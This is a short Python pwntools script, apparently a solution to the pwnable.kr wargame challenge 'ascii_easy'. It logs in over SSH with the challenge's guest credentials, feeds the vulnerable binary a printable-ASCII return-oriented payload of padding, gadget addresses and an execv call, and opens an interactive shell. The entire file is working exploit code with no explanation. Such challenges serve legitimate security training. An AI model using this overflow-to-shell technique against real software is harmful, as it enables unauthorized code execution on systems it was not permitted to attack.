#!/usr/bin/python

from pwn import *

s = ssh(host='pwnable.kr', port=2222, user='ascii_easy', password='guest')

#                               pops       x                            y               eax=x+y              ret         execv
payload = 'X'.ljust(32, 'X') + r'kPWU' + r'vA2#' + 'EBXX' + 'ESII' + r'vv92' + 'EBPP' + r's5_U' + 'EDII'  + 'v5_U' * 6 + 'ggaU'

t = s.process(["./ascii_easy", payload])
t.interactive()

